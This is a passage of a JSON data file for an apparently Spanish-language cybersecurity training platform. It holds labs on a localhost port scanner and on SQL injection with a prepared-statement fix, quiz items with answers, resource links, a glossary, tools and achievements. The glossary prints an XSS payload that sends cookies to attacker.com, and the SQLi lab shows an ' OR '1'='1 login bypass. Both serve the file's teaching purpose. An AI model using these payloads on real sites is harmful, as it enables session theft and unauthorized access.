          "description": "Escribe el siguiente código de prueba seguro orientando a `127.0.0.1`:\\nimport socket\\n\\ntarget = '127.0.0.1'\\nports = [21, 22, 80, 443, 8080]\\n\\nfor port in ports:\\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\n    s.settimeout(0.5)\\n    result = s.connect_ex((target, port))\\n    if result == 0:\\n        print(f'[+] Puerto {port}: ABIERTO')\\n    else:\\n        print(f'[-] Puerto {port}: CERRADO')\\n    s.close()"
        },
        {
          "step": 2,
          "title": "Ejecución del Escáner Local",
          "command": "python3 port_scanner.py",
          "description": "Ejecuta el script y analiza el resultado impreso en consola."
        }
      ],
      "questions": [
        {
          "id": "l4-q1",
          "question": "¿Qué valor retorna la función `socket.connect_ex()` cuando la conexión TCP se establece con éxito?",
          "options": [
            "0",
            "1",
            "-1",
            "200"
          ],
          "answer": 0
        }
      ],
      "solution": "El escáner en Python verificó satisfactoriamente la disponibilidad de puertos sin requerir librerías de terceros.",
      "mitigation": "Configurar firewalls de host para rechazar escaneos no autorizados y deshabilitar servicios innecesarios."
    },
    {
      "id": "lab-005",
      "number": "Lab 005",
      "title": "Identificación de Vulnerabilidad SQL Injection en Entorno de Prueba",
      "category": "Seguridad Web",
      "difficulty": "Avanzado",
      "xp": 220,
      "objective": "Comprender la dinámica de una Inyección SQL clásica (SQLi) en una aplicación web de laboratorio deliberadamente vulnerable (DVWA / OWASP Juice Shop) y aplicar sentencias preparadas para corregirla.",
      "prerequisites": [
        "mod-07",
        "mod-09"
      ],
      "preparation": "Servidor web de laboratorio de prueba desplegado en localhost.",
      "steps": [
        {
          "step": 1,
          "title": "Identificación del Punto de Inyección",
          "command": "user_id = ' OR '1'='1",
          "description": "Ingresa la comilla simple `'` en el campo de búsqueda para forzar un error de sintaxis SQL y validar la falta de sanitización."
        },
        {
          "step": 2,
          "title": "Evitación de Autenticación",
          "command": "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''",
          "description": "Observa cómo la condición `'1'='1'` evalúa siempre a verdadero devolviendo todos los registros de la tabla."
        },
        {
          "step": 3,
          "title": "Remediación con Sentencias Preparadas (Prepared Statements)",
          "command": "cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (user, pwd))",
          "description": "Sustituye la concatenación directa de cadenas por consultas parametrizadas donde el motor de base de datos trata el input estrictamente como dato."
        }
      ],
      "questions": [
        {
          "id": "l5-q1",
          "question": "¿Cuál es la defensa primaria y más efectiva contra los ataques de inyección SQL?",
          "options": [
            "Cifrar el disco duro del servidor",
            "Uso de Consultas Parametrizadas / Sentencias Preparadas (Prepared Statements)",
            "Usar contraseñas más largas",
            "Ocultar el puerto de la base de datos"
          ],
          "answer": 1
        }
      ],
      "solution": "La implementación de consultas parametrizadas neutralizó completamente el vector de inyección SQL.",
      "mitigation": "Adoptar ORMs seguros, aplicar WAF (Web Application Firewall) y realizar análisis SAST/DAST continuo."
    }
  ],
  "resources": [
    {
      "id": "res-01",
      "title": "Curso de Redes e Internet desde Cero",
      "description": "Explicación clara y detallada sobre el funcionamiento del protocolo TCP/IP, subredes, DNS y enrutamiento en español.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Principiante",
      "category": "Redes",
      "duration": "4 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+redes+tcp+ip+desde+cero+espanol",
      "rating": 5
    },
    {
      "id": "res-02",
      "title": "Documentación Oficial de Linux en Español",
      "description": "Manuales y guías completas sobre comandos, administración del sistema y archivos de configuración en Linux.",
      "language": "es",
      "type": "📖 Documentación",
      "level": "Principiante",
      "category": "Linux",
      "duration": "Lectura libre",
      "url": "https://manpages.debian.org/",
      "rating": 5
    },
    {
      "id": "res-03",
      "title": "OpenWebinars - Fundamentos de Ciberseguridad",
      "description": "Curso introductorio en español sobre conceptos básicos de ciberseguridad, gestión de riesgos y protección personal.",
      "language": "es",
      "type": "📚 Curso",
      "level": "Principiante",
      "category": "Fundamentos",
      "duration": "6 hrs",
      "url": "https://openwebinars.net/cursos/fundamentos-ciberseguridad/",
      "rating": 4
    },
    {
      "id": "res-04",
      "title": "PortSwigger Web Security Academy",
      "description": "La plataforma de entrenamiento interactivo gratuita más completa del mundo para aprender seguridad web y OWASP Top 10.",
      "language": "es",
      "type": "🧪 Laboratorio",
      "level": "Intermedio",
      "category": "Seguridad Web",
      "duration": "Práctico",
      "url": "https://portswigger.net/web-security",
      "rating": 5
    },
    {
      "id": "res-05",
      "title": "INCIBE - Guías de Seguridad para Ciudadanos y Empresas",
      "description": "Material institucional en español publicado por el Instituto Nacional de Ciberseguridad de España.",
      "language": "es",
      "type": "🌐 Sitio web",
      "level": "Principiante",
      "category": "Fundamentos",
      "duration": "Lectura",
      "url": "https://www.incibe.es/",
      "rating": 5
    },
    {
      "id": "res-06",
      "title": "TryHackMe - Pre-Security Path",
      "description": "Ruta de aprendizaje guiada en línea para dominar fundamentos de redes, Linux, Windows y web.",
      "language": "es",
      "type": "🧪 Laboratorio",
      "level": "Principiante",
      "category": "Fundamentos",
      "duration": "15 hrs",
      "url": "https://tryhackme.com/path/outline/pre-security",
      "rating": 5
    },
    {
      "id": "res-07",
      "title": "Curso de Python para Hacking Ético en Español",
      "description": "Aprende a programar tus propias herramientas de ciberseguridad, escáneres de puertos y herramientas de red con Python.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Intermedio",
      "category": "Programación",
      "duration": "8 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+python+para+ciberseguridad+espanol",
      "rating": 5
    },
    {
      "id": "res-08",
      "title": "OWASP Top 10 Documentation (Español)",
      "description": "Traducción oficial del documento OWASP Top 10 sobre las vulnerabilidades web más críticas en aplicaciones.",
      "language": "es",
      "type": "📖 Documentación",
      "level": "Intermedio",
      "category": "Seguridad Web",
      "duration": "3 hrs",
      "url": "https://owasp.org/www-project-top-ten/",
      "rating": 5
    },
    {
      "id": "res-09",
      "title": "Hack The Box Academy - Linux Fundamentals",
      "description": "Módulo interactivo completo sobre uso avanzado de la consola de comandos de Linux.",
      "language": "es",
      "type": "🧪 Laboratorio",
      "level": "Principiante",
      "category": "Linux",
      "duration": "8 hrs",
      "url": "https://academy.hackthebox.com/module/details/18",
      "rating": 5
    },
    {
      "id": "res-10",
      "title": "Libro: Ciberseguridad Global - Defensa y Estrategia",
      "description": "Conceptos teóricos y prácticos sobre gestión de incidentes, ISO 27001 y arquitectura defensiva.",
      "language": "es",
      "type": "📕 Libro",
      "level": "Intermedio",
      "category": "Seguridad",
      "duration": "Lectura",
      "url": "https://es.wikipedia.org/wiki/Seguridad_inform%C3%A1tica",
      "rating": 4
    },
    {
      "id": "res-11",
      "title": "Curso de PowerShell para Administradores y Seguridad",
      "description": "Automatización en sistemas Windows y análisis de tareas administrativas con PowerShell.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Intermedio",
      "category": "Windows",
      "duration": "5 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+powershell+desde+cero+espanol",
      "rating": 4
    },
    {
      "id": "res-12",
      "title": "CISA - Known Exploited Vulnerabilities Catalog",
      "description": "Catálogo oficial del gobierno de EEUU de vulnerabilidades conocidas activamente explotadas en el mundo.",
      "language": "us",
      "type": "🌐 Sitio web",
      "level": "Avanzado",
      "category": "Threat Intelligence",
      "duration": "Consulta",
      "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
      "rating": 5
    },
    {
      "id": "res-13",
      "title": "MITRE ATT&CK Matrix Official Framework",
      "description": "Base de conocimientos mundial sobre tácticas, técnicas y procedimientos de adversarios reales.",
      "language": "us",
      "type": "🌐 Sitio web",
      "level": "Avanzado",
      "category": "SOC & Detección",
      "duration": "Consulta",
      "url": "https://attack.mitre.org/",
      "rating": 5
    },
    {
      "id": "res-14",
      "title": "Curso de Análisis Forense Digital (DFIR) Introductorio",
      "description": "Metodología de preservación de evidencia, análisis de cadena de custodia y artefactos en español.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Intermedio",
      "category": "Forense",
      "duration": "4 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+forense+digital+espanol",
      "rating": 4
    },
    {
      "id": "res-15",
      "title": "Wireshark Official User's Guide",
      "description": "Documentación oficial del analizador de paquetes de red más popular.",
      "language": "us",
      "type": "📖 Documentación",
      "level": "Intermedio",
      "category": "Redes",
      "duration": "Lectura",
      "url": "https://www.wireshark.org/docs/wsug_html_chunked/",
      "rating": 5
    },
    {
      "id": "res-16",
      "title": "Cisco Networking Academy - Introduction to Cybersecurity",
      "description": "Curso gratuito oficial en español emitido por Cisco con certificado de finalización.",
      "language": "es",
      "type": "🎓 Certificación",
      "level": "Principiante",
      "category": "Fundamentos",
      "duration": "15 hrs",
      "url": "https://www.netacad.com/courses/cybersecurity/introduction-cybersecurity",
      "rating": 5
    },
    {
      "id": "res-17",
      "title": "GTFOBins - Unix Binaries Exploitation Guide",
      "description": "Lista curada de binarios Unix que pueden ser utilizados para eludir restricciones de seguridad locales.",
      "language": "us",
      "type": "🛠️ Herramienta",
      "level": "Avanzado",
      "category": "Linux",
      "duration": "Consulta",
      "url": "https://gtfobins.github.io/",
      "rating": 5
    },
    {
      "id": "res-18",
      "title": "LOLBAS - Windows Binaries and Scripts",
      "description": "Catálogo de binarios legítimos de Windows (Living Off The Land) utilizados por atacantes y administradores.",
      "language": "us",
      "type": "🛠️ Herramienta",
      "level": "Avanzado",
      "category": "Windows",
      "duration": "Consulta",
      "url": "https://lolbas-project.github.io/",
      "rating": 5
    },
    {
      "id": "res-19",
      "title": "SANS Institute - Free Security Resources & Cheatsheets",
      "description": "Hojas de referencia rápidas para respuesta a incidentes, análisis de memoria y bastionado de sistemas.",
      "language": "us",
      "type": "📄 Paper",
      "level": "Avanzado",
      "category": "Blue Team",
      "duration": "Lectura",
      "url": "https://www.sans.org/cheat-sheets/",
      "rating": 5
    },
    {
      "id": "res-20",
      "title": "Curso de Malware Analysis Básico en Español",
      "description": "Fundamentos de análisis estático y dinámico de muestras maliciosas en entornos aislados.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Avanzado",
      "category": "Malware",
      "duration": "6 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+analisis+de+malware+espanol",
      "rating": 4
    },
    {
      "id": "res-21",
      "title": "Cyberchef - The Cyber Swiss Army Knife",
      "description": "Aplicación web intuitiva para codificar, decodificar, analizar hashes y manipular datos criptográficos.",
      "language": "us",
      "type": "🛠️ Herramienta",
      "level": "Principiante",
      "category": "Herramientas",
      "duration": "Práctico",
      "url": "https://gchq.github.io/CyberChef/",
      "rating": 5
    },
    {
      "id": "res-22",
      "title": "NIST Cybersecurity Framework (CSF)",
      "description": "Marco de trabajo estándar de la industria sobre Identificar, Proteger, Detectar, Responder y Recuperar.",
      "language": "us",
      "type": "📖 Documentación",
      "level": "Intermedio",
      "category": "Seguridad",
      "duration": "Lectura",
      "url": "https://www.nist.gov/cyberframework",
      "rating": 5
    },
    {
      "id": "res-23",
      "title": "Curso de Criptografía Aplicada",
      "description": "Conceptos de cifrado simétrico, asimétrico, funciones Hash y firmas digitales explicados en español.",
      "language": "es",
      "type": "📚 Curso",
      "level": "Intermedio",
      "category": "Criptografía",
      "duration": "5 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+criptografia+aplicada+espanol",
      "rating": 4
    },
    {
      "id": "res-24",
      "title": "Blue Team Labs Online",
      "description": "Plataforma de entrenamiento defensivo basada en investigación de casos y escenarios reales de SOC.",
      "language": "us",
      "type": "🧪 Laboratorio",
      "level": "Intermedio",
      "category": "Blue Team",
      "duration": "Práctico",
      "url": "https://blueteamlabs.online/",
      "rating": 5
    },
    {
      "id": "res-25",
      "title": "Nmap Official Network Scanning Book",
      "description": "Manual oficial de descubrimiento de red y auditoría de seguridad de Gordon Fyodor Lyon.",
      "language": "us",
      "type": "📖 Documentación",
      "level": "Intermedio",
      "category": "Redes",
      "duration": "Lectura",
      "url": "https://nmap.org/book/",
      "rating": 5
    },
    {
      "id": "res-26",
      "title": "Curso Introductorio a Docker y Contenedores",
      "description": "Aprende a crear, aislar y gestionar contenedores en entornos Linux y desarrollo.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Intermedio",
      "category": "DevSecOps",
      "duration": "3 hrs",
      "url": "https://www.youtube.com/results?search_query=curso+docker+desde+cero+espanol",
      "rating": 4
    },
    {
      "id": "res-27",
      "title": "Metasploit Unleashed - Offensive Security",
      "description": "Curso gratuito completo de administración y pruebas de penetración con Metasploit Framework.",
      "language": "us",
      "type": "📚 Curso",
      "level": "Avanzado",
      "category": "Pentesting",
      "duration": "12 hrs",
      "url": "https://www.offsec.com/metasploit-unleashed/",
      "rating": 5
    },
    {
      "id": "res-28",
      "title": "Reverse Engineering for Beginners (Dennis Yurichev)",
      "description": "Libro gratuito de referencia esencial para aprender ensamblador x86/x64 e ingeniería inversa.",
      "language": "us",
      "type": "📕 Libro",
      "level": "Experto",
      "category": "Reverse Engineering",
      "duration": "Lectura",
      "url": "https://yurichev.com/RE-book.html",
      "rating": 5
    },
    {
      "id": "res-29",
      "title": "Active Directory Security Basics (Spanish)",
      "description": "Conceptos clave sobre Dominios Windows, Kerberos, LDAP y hardening de infraestructura de Active Directory.",
      "language": "es",
      "type": "🎥 Video",
      "level": "Avanzado",
      "category": "Active Directory",
      "duration": "4 hrs",
      "url": "https://www.youtube.com/results?search_query=active+directory+ciberseguridad+espanol",
      "rating": 4
    },
    {
      "id": "res-30",
      "title": "Cloud Security Alliance (CSA) Security Guidance",
      "description": "Guía de mejores prácticas para la seguridad en entornos de computación en la nube.",
      "language": "us",
      "type": "📄 Paper",
      "level": "Avanzado",
      "category": "Cloud Security",
      "duration": "Lectura",
      "url": "https://cloudsecurityalliance.org/research/guidance/",
      "rating": 5
    }
  ],
  "glossary": [
    {
      "term": "TCP (Transmission Control Protocol)",
      "simpleDef": "Protocolo de red que garantiza que los mensajes lleguen completos y en orden correcto a su destino.",
      "techDef": "Protocolo de capa de transporte orientado a conexión que utiliza números de secuencia, reconocimientos (ACK) y control de flujo para asegurar entregas confiables.",
      "example": "El tráfico web HTTPS o la transferencia de archivos por SSH utilizan TCP.",
      "related": [
        "UDP",
        "IP",
        "Handshake"
      ]
    },
    {
      "term": "UDP (User Datagram Protocol)",
      "simpleDef": "Protocolo de red súper rápido que envía datos sin verificar si llegaron todos o en orden.",
      "techDef": "Protocolo de capa de transporte no orientado a conexión y sin estado. Reduce la latencia al omitir handshakes o confirmaciones.",
      "example": "Transmisión de video en vivo, llamadas VoIP y consultas DNS usan UDP.",
      "related": [
        "TCP",
        "DNS",
        "Sockets"
      ]
    },
    {
      "term": "DNS (Domain Name System)",
      "simpleDef": "La libreta de direcciones de Internet que traduce nombres legibles (google.com) a direcciones IP numéricas.",
      "techDef": "Sistema jerárquico y distribuido de bases de datos que resuelve nombres de dominio a direcciones IPv4/IPv6 mediante servidores raíz, TLD y autoritativos.",
      "example": "Escribir 'cyberlab.edu' activa una consulta al puerto 53 para obtener la IP 192.168.1.50.",
      "related": [
        "IP",
        "HTTP",
        "Envenenamiento DNS"
      ]
    },
    {
      "term": "SIEM (Security Information and Event Management)",
      "simpleDef": "Un centro de control centralizado que recolecta alertas de todos los equipos de la empresa para detectar ataques.",
      "techDef": "Plataforma que centraliza, agrega y correlaciona logs de seguridad en tiempo real para generar alertas y permitir investigaciones forenses.",
      "example": "Splunk, Microsoft Sentinel y Elastic SIEM son soluciones populares de SIEM.",
      "related": [
        "SOC",
        "Logs",
        "MITRE ATT&CK"
      ]
    },
    {
      "term": "EDR (Endpoint Detection and Response)",
      "simpleDef": "Un antivirus avanzado instalado en las computadoras que monitorea constantemente comportamientos sospechosos.",
      "techDef": "Agente de seguridad en host que combina monitoreo continuo de procesos, análisis de comportamiento y aislamiento remoto de endpoints comprometidos.",
      "example": "CrowdStrike Falcon o Defender for Endpoint detectando la inyección de código en un proceso legítimo.",
      "related": [
        "SIEM",
        "SOC",
        "Malware"
      ]
    },
    {
      "term": "IOC (Indicator of Compromise)",
      "simpleDef": "Una huella o pista digital que confirma que una computadora o red fue infectada.",
      "techDef": "Artefacto forense (dirección IP maliciosa, hash de archivo, clave de registro) que demuestra la presencia de una intrusión con alto grado de certidumbre.",
      "example": "El hash SHA-256 `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` pertenece a un ejecutable malicioso.",
      "related": [
        "IOA",
        "Threat Intelligence",
        "Forense"
      ]
    },
    {
      "term": "IOA (Indicator of Attack)",
      "simpleDef": "Una señal en tiempo real que indica que un ataque está ocurriendo en este preciso instante.",
      "techDef": "Indicador enfocado en la intención y comportamiento del adversario en tiempo real, independientemente de las herramientas o hashes utilizados.",
      "example": "Intentos consecutivos de ejecución de comandos PowerShell codificados en Base64.",
      "related": [
        "IOC",
        "TTP",
        "Detección"
      ]
    },
    {
      "term": "TTP (Tactics, Techniques, and Procedures)",
      "simpleDef": "El estilo de juego y metodología típica que utiliza un grupo de hackers para atacar.",
      "techDef": "Descripción conceptual del comportamiento de las amenazas avanzadas (APTs), categorizadas en el marco de trabajo MITRE ATT&CK.",
      "example": "El grupo APT29 utiliza Phishing (Táctica: Acceso Inicial) y PowerShell (Técnica: Ejecución).",
      "related": [
        "MITRE ATT&CK",
        "Threat Intelligence"
      ]
    },
    {
      "term": "XSS (Cross-Site Scripting)",
      "simpleDef": "Vulnerabilidad web donde un atacante logra inyectar código JavaScript malicioso en una página para robar cookies de otros usuarios.",
      "techDef": "Vulnerabilidad de aplicaciones web donde entradas no sanitizadas son renderizadas en el navegador de la víctima, ejecutando scripts arbitrarios.",
      "example": "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
      "related": [
        "Seguridad Web",
        "CSRF",
        "OWASP"
      ]
    },
    {
      "term": "CSRF (Cross-Site Request Forgery)",
      "simpleDef": "Engañar al navegador de un usuario autenticado para que realice acciones involuntarias en un sitio de confianza.",
      "techDef": "Ataque que fuerza a un cliente autenticado a enviar peticiones HTTP no deseadas hacia una aplicación web vulnerable aprovechando las cookies de sesión automáticas.",
      "example": "Hacer clic en un enlace falso que envía una transferencia de dinero sin el consentimiento del usuario.",
      "related": [
        "XSS",
        "Cookies",
        "Tokens"
      ]
    },
    {
      "term": "SQLi (SQL Injection)",
      "simpleDef": "Inyectar comandos de base de datos en un formulario para leer o alterar información confidencial.",
      "techDef": "Inserción de fragmentos de código SQL en parámetros de entrada no validados que alteran la lógica de la consulta enviada a la base de datos.",
      "example": "Ingresar `' OR '1'='1` en el campo de usuario para saltarse la autenticación.",
      "related": [
        "Base de datos",
        "Prepared Statements",
        "OWASP"
      ]
    },
    {
      "term": "CVE (Common Vulnerabilities and Exposures)",
      "simpleDef": "Un identificador único internacional asignado a cada fallo de ciberseguridad conocido públicamente.",
      "techDef": "Diccionario estandarizado de identificadores públicos asignados a vulnerabilidades de seguridad informáticas de software y hardware.",
      "example": "CVE-2021-44228 es el identificador oficial de la vulnerabilidad crítica Log4Shell.",
      "related": [
        "CVSS",
        "NVD",
        "Vulnerabilidad"
      ]
    },
    {
      "term": "CVSS (Common Vulnerability Scoring System)",
      "simpleDef": "El puntaje numérico del 0 al 10 que indica qué tan severa y peligrosa es una vulnerabilidad.",
      "techDef": "Estándar abierto para evaluar la gravedad de las vulnerabilidades de seguridad informática según métricas base, temporales y ambientales.",
      "example": "Log4Shell tiene una puntuación CVSSv3 de 10.0 (Crítica).",
      "related": [
        "CVE",
        "Riesgo"
      ]
    },
    {
      "term": "MITRE ATT&CK",
      "simpleDef": "La enciclopedia global más famosa que organiza todas las formas conocidas en que los hackers atacan a las empresas.",
      "techDef": "Matriz estructurada de conocimiento accesible globalmente sobre las tácticas y técnicas de los adversarios basadas en observaciones del mundo real.",
      "example": "Revisar la matriz para entender cómo los atacantes realizan movimiento lateral dentro de un entorno Windows.",
      "related": [
        "TTP",
        "SOC",
        "Blue Team"
      ]
    },
    {
      "term": "SOC (Security Operations Center)",
      "simpleDef": "El equipo y centro de operaciones encargado de vigilar las 24 horas del día las alertas de seguridad de una empresa.",
      "techDef": "Unidad centralizada dentro de una organización encargada de monitorear, detectar, analizar y responder a incidentes de ciberseguridad continuamente.",
      "example": "Los analistas Nivel 1 del SOC filtran alertas del SIEM y escalan incidentes a Nivel 2.",
      "related": [
        "SIEM",
        "Incident Response",
        "EDR"
      ]
    },
    {
      "term": "DFIR (Digital Forensics and Incident Response)",
      "simpleDef": "Los detectives de la ciberseguridad que investigan qué ocurrió exactamente tras un ciberataque.",
      "techDef": "Disciplina especializada que combina la recolección estricta de evidencia digital (Forense) con la contención y remediación de brechas (Respuesta a Incidentes).",
      "example": "Extraer la memoria RAM de un servidor infectado para recuperar la clave de cifrado del ransomware.",
      "related": [
        "Forense",
        "IOC",
        "Memoria"
      ]
    },
    {
      "term": "OSINT (Open Source Intelligence)",
      "simpleDef": "La recolección legal y ética de información pública disponible en Internet para investigar objetivos.",
      "techDef": "Metodología de inteligencia que recopila, procesa y analiza datos accesibles públicamente en fuentes abiertas (redes sociales, registros DNS, motores de búsqueda).",
      "example": "Utilizar Shodan o Google Dorking para descubrir servidores expuestos por error.",
      "related": [
        "Reconocimiento",
        "Pentesting"
      ]
    },
    {
      "term": "IAM (Identity and Access Management)",
      "simpleDef": "El sistema que administra las identidades de los usuarios y asegura que solo accedan a lo que necesitan.",
      "techDef": "Marco de políticas y tecnologías que garantiza que las personas adecuadas tengan el acceso apropiado a los recursos tecnológicos requeridos.",
      "example": "AWS IAM gestionando roles, políticas y claves de acceso para recursos en la nube.",
      "related": [
        "MFA",
        "Autenticación",
        "Principio de Mínimo Privilegio"
      ]
    },
    {
      "term": "MFA (Multi-Factor Authentication)",
      "simpleDef": "Requerir dos o más pruebas de identidad antes de permitir iniciar sesión (ej: contraseña + código al celular).",
      "techDef": "Sistema de seguridad que requiere dos o más factores independientes de verificación: algo que sabes (contraseña), algo que tienes (token TOTP) o algo que eres (huella).",
      "example": "Ingresar tu clave de usuario y validar la notificación en Google Authenticator.",
      "related": [
        "IAM",
        "Autenticación"
      ]
    },
    {
      "term": "Zero Trust (Confianza Cero)",
      "simpleDef": "Filosofía de seguridad que asume que la red interna ya está infectada y verifica estrictamente cada petición.",
      "techDef": "Modelo de seguridad basado en el principio 'Nunca confíes, siempre verifica'. Requiere autenticación y autorización continua de cada solicitud sin importar el origen de red.",
      "example": "Exigir MFA y verificación del estado del dispositivo incluso si la computadora está conectada a la oficina física.",
      "related": [
        "IAM",
        "Hardening",
        "Defensa en Profundidad"
      ]
    }
  ],
  "tools": [
    {
      "name": "Nmap (Network Mapper)",
      "category": "Networking & Recon",
      "os": "Linux, Windows, macOS",
      "level": "Principiante - Avanzado",
      "description": "La herramienta estándar de la industria para escaneo de puertos, descubrimiento de hosts en red y detección de versiones de servicios y sistemas operativos.",
      "officialUrl": "https://nmap.org/",
      "usageContext": "Se utiliza en auditorías de red para cartografiar todos los dispositivos conectados y verificar qué puertos y servicios están abiertos antes de un análisis de vulnerabilidades.",
      "labTies": "Lab-004, Módulo 6 (Redes)"
    },
    {
      "name": "Wireshark",
      "category": "Networking & Análisis",
      "os": "Linux, Windows, macOS",
      "level": "Principiante - Avanzado",
      "description": "El analizador de protocolos de red gráfico más relevante del mundo. Permite capturar e inspeccionar tráfico de red a nivel de bit.",
      "officialUrl": "https://www.wireshark.org/",
      "usageContext": "Indispensable para analizar Handshakes de red, depurar comunicaciones, detectar filtración de datos sin cifrar e investigar sospechas de malware.",
      "labTies": "Lab-001, Módulo 7 (Internet)"
    },
    {
      "name": "Burp Suite (Community / Professional)",
      "category": "Seguridad Web",
      "os": "Linux, Windows, macOS",
      "level": "Intermedio - Experto",
      "description": "Proxy de interceptación HTTP/HTTPS líder para realizar auditorías de seguridad en aplicaciones web y APIs.",
      "officialUrl": "https://portswigger.net/burp",
      "usageContext": "Se interpone entre el navegador y la aplicación web para interceptar, modificar y repetir peticiones en busca de vulnerabilidades como XSS, SQLi y fallos de autorización.",
      "labTies": "Lab-005, Módulo 9 (Seguridad)"
    },
    {
      "name": "Autopsy Digital Forensics",
      "category": "Forense Digital",
      "os": "Windows, Linux",
      "level": "Intermedio - Avanzado",
      "description": "Plataforma gráfica de análisis forense digital para investigar imágenes de disco duro, tarjetas de memoria y recuperar archivos eliminados.",
      "officialUrl": "https://www.autopsy.com/",
      "usageContext": "Utilizada por analistas DFIR y fuerzas del orden para analizar sistemas de archivos (NTFS, EXT4), extraer historial de navegación y analizar la línea de tiempo de un incidente.",
      "labTies": "CyberCases, Módulo 3 (Sistemas)"
    },
    {
      "name": "Volatility Framework",
      "category": "Forense & Memoria",
      "os": "Linux, Windows, macOS",
      "level": "Avanzado - Experto",
      "description": "Framework avanzado de procesamiento de volcados de memoria RAM para la extracción de artefactos volátiles.",
      "officialUrl": "https://www.volatilityfoundation.org/",
      "usageContext": "Permite recuperar inyecciones de código en memoria, sockets activos, listas de procesos ocultos y artefactos que no tocaron el disco duro.",
      "labTies": "Módulo 2 (Hardware), Reto 7"
    },
    {
      "name": "Metasploit Framework",
      "category": "Pentesting & Red Team",
      "os": "Linux, macOS, Windows",
      "level": "Intermedio - Experto",
      "description": "La plataforma de desarrollo de exploits y pruebas de penetración más extendida globalmente.",
      "officialUrl": "https://www.metasploit.com/",
      "usageContext": "Utilizada por equipos de Red Team para validar vulnerabilidades previamente descubiertas en laboratorios autorizados mediante cargas útiles (Payloads/Meterpreter).",
      "labTies": "Módulo 9 (Seguridad)"
    },
    {
      "name": "Snort / Suricata",
      "category": "Blue Team & IDS/IPS",
      "os": "Linux, Windows",
      "level": "Intermedio - Avanzado",
      "description": "Sistemas de detección y prevención de intrusiones (IDS/IPS) basados en firmas y patrones de tráfico de red.",
      "officialUrl": "https://www.snort.org/",
      "usageContext": "Inspeccionan los paquetes de red en tiempo real comparándolos con reglas conocidas para bloquear intentos de intrusión y notificar al SIEM.",
      "labTies": "Módulo 10 (SOC)"
    },
    {
      "name": "Process Monitor (Procmon - Sysinternals)",
      "category": "Windows & Malware",
      "os": "Windows",
      "level": "Intermedio",
      "description": "Herramienta avanzada de supervisión para Windows que muestra la actividad en tiempo real del sistema de archivos, el Registro y los procesos/hilos.",
      "officialUrl": "https://learn.microsoft.com/en-us/sysinternals/downloads/procmon",
      "usageContext": "Esencial para el análisis dinámico de malware en laboratorio para ver qué archivos intenta crear, modificar o borrar una muestra.",
      "labTies": "Lab-003, Módulo 5 (Windows)"
    },
    {
      "name": "Ghidra",
      "category": "Reverse Engineering",
      "os": "Linux, Windows, macOS",
      "level": "Experto",
      "description": "Suite de desensamblado e ingeniería inversa desarrollada por la NSA (National Security Agency) y liberada como código abierto.",
      "officialUrl": "https://ghidra-sre.org/",
      "usageContext": "Analiza ejecutables compilados binarios (PE, ELF) convirtiendo código máquina en desensamblado o descompilado en C para analizar lógica interna sin tener el código fuente.",
      "labTies": "Etapa 14 (Reverse Engineering)"
    },
    {
      "name": "CyberChef",
      "category": "Automatización & Cripto",
      "os": "Web App (Browser / Offline)",
      "level": "Principiante - Avanzado",
      "description": "Conocida como la 'Navaja Suiza Digital', es una herramienta web para manipulación de datos, conversiones Base64, operaciones criptográficas y análisis de texto.",
      "officialUrl": "https://gchq.github.io/CyberChef/",
      "usageContext": "Ideal para decodificar payloads ofuscados, desobstruir cadenas Base64 o Hexadecimal y extraer direcciones IP de bloques de texto masivos.",
      "labTies": "Módulo 8, Retos de Laboratorio"
    }
  ],
  "achievements": [
    {
      "id": "ach-01",
      "name": "Primer Paso en el CyberLab",
      "icon": "🎯",
      "description": "Completar la lectura del primer concepto teórico en la plataforma.",
      "xpReward": 50,
      "condition": "conceptsRead >= 1"
    },
    {
      "id": "ach-02",
      "name": "Primer Cuestionario Superado",
      "icon": "📝",
      "description": "Aprobar tu primer examen o cuestionario con más del 80% de aciertos.",
      "xpReward": 100,
      "condition": "quizzesPassed >= 1"
    },
    {
      "id": "ach-03",
      "name": "Investigador en CiberLabs",
      "icon": "🧪",
      "description": "Completar exitosamente tu primer laboratorio práctico guiado.",
      "xpReward": 150,
      "condition": "labsCompleted >= 1"
    },
    {
      "id": "ach-04",
      "name": "Racha de 7 Días",
      "icon": "🔥",
      "description": "Mantener una racha ininterrumpida de estudio durante 7 días consecutivos.",
      "xpReward": 250,
      "condition": "streakDays >= 7"
    },
    {
      "id": "ach-05",
      "name": "Dominio de Redes",
      "icon": "🌐",
      "description": "Alcanzar el nivel de dominio 'Dominado' (Nivel 5/6) en todos los conceptos del módulo de Redes.",
      "xpReward": 300,
      "condition": "networkingMastered == true"
    },
    {
      "id": "ach-06",
      "name": "Dominio de Linux",
      "icon": "🐧",
      "description": "Alcanzar el nivel de dominio en conceptos fundamentales de Linux.",
      "xpReward": 300,
      "condition": "linuxMastered == true"
    },
    {
      "id": "ach-07",
      "name": "Primer Análisis Forense",
      "icon": "🔍",
      "description": "Resolver exitosamente un reto de análisis de logs o investigación de casos.",
      "xpReward": 200,
      "condition": "challengesCompleted >= 1"
    },
    {
      "id": "ach-08",
      "name": "Bitácora Personal",
      "icon": "📓",
      "description": "Crear y guardar al menos 5 notas explicativas personales en 'Mis Apuntes'.",
      "xpReward": 100,
      "condition": "notesCount >= 5"
    },
    {
      "id": "ach-09",
      "name": "Aprendiz Honesto",
      "icon": "💡",
      "description": "Registrar tu primer fallo en 'Errores que cometí' para activar la repetición espaciada.",
      "xpReward": 75,
      "condition": "mistakesLogged >= 1"
    },
    {
      "id": "ach-10",
      "name": "Guardián de la Plataforma",
      "icon": "🛡️",
      "description": "Exportar una copia de seguridad de tu progreso en formato JSON.",
      "xpReward": 150,
      "condition": "backupExported == true"
    }
  ],
  "projects": [
    {
      "id": "proj-01",
      "title": "Proyecto 1: Herramienta CLI Sencilla en Python",
